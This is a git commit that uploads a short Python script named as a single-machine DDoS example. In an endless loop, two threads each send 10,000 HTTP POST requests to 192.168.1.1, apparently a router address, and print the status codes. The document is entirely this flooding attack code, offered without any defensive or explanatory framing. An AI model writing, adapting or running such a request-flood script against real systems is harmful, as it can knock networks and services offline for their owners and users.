99e42c8d3bdc7d369ad8648029d77caf73840793
Subham Lamichhane <lamichhanesubham4@gmail.com>
2025-05-30 06:27:00 -0400

    Add files via upload

---
+++ singlemachinceddosexample.py
@@ -0,0 +1,22 @@
+import threading
+import requests
+while True :
+ def uptask():
+    url='http://192.168.1.1'
+    for i in range (10000):
+     response1=requests.post(url)
+     print(response1.status_code)
+    
+ def downtask():
+    url='http://192.168.1.1' 
+    for i in range (10000):
+    
+     response2=requests.post(url)
+     print(response2.status_code)
+    
+ thread1=threading.Thread(target=uptask)
+ thread2=threading.Thread(target=downtask)
+ thread1.start()
+ thread2.start()
+ thread1.join()
+ thread2.join()
